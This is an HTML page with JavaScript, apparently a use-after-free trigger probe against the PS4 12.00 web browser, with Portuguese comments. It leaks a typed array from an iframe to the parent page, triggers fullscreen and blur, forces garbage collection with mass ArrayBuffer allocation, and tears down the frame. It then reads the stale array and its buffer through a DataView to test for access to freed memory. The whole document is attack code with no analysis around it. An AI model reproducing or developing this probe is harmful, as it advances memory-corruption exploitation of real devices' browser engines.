<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Iframe UAF Probe - Corrected</title>
</head>
<body>

<h2>PS4 12.00 - Iframe UAF Probe (Real Reference)</h2>

<button onclick="startTest()">Start Test</button>

<pre id="log" style="background:#111;color:#0f0;padding:10px;height:300px;overflow:auto;"></pre>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

// referência global no parent (ESSENCIAL)
window.leakedArray = null;

function startTest() {
    log("[*] Criando iframe...");

    const iframe = document.createElement("iframe");
    iframe.style.width = "400px";
    iframe.style.height = "200px";
    document.body.appendChild(iframe);

    const fDoc = iframe.contentDocument || iframe.contentWindow.document;

    fDoc.open();
    fDoc.write(`
        <html>
        <body>
        <button onclick="run()">Run Inside Frame</button>

        <script>
        let arr = new Float64Array(8);
        arr[0] = 13.37;

        window.run = function() {

            // 🔥 PASSO CRÍTICO: LEAK REAL (sem cópia)
            parent.leakedArray = arr;

            // fullscreen (mesma cadeia do bug)
            document.documentElement.webkitRequestFullscreen?.();

            window.onblur = function() {

                // 🔥 PRESSÃO DE GC (como seu teste de maior crash rate)
                arr = null;

                for (let i = 0; i < 20000; i++) {
                    new ArrayBuffer(0x10000);
                }

                // 🔥 TEARDOWN CRÍTICO
                setTimeout(() => {
                    document.open();
                    document.write("<h1>Teardown</h1>");
                    document.close();
                }, 1000);
            };
        };
        <\/script>

        </body>
        </html>
    `);
    fDoc.close();

    // =========================
    // TESTES PÓS-TEARDOWN (NO PARENT)
    // =========================
    setTimeout(() => {

        log("[*] Testando acesso pós-teardown...");

        try {
            log("[TEST A] Valor:");
            log(window.leakedArray ? window.leakedArray[0] : "null");
        } catch(e) {
            log("[TEST A ERROR] " + e);
        }

        try {
            log("[TEST B] Buffer:");
            log(window.leakedArray ? window.leakedArray.buffer.byteLength : "null");
        } catch(e) {
            log("[TEST B ERROR] " + e);
        }

        try {
            log("[TEST C] DataView:");
            let dv = new DataView(window.leakedArray.buffer);
            log(dv.getUint32(0, true));
        } catch(e) {
            log("[TEST C ERROR] " + e);
        }

    }, 4000);
}
</script>

</body>
</html>
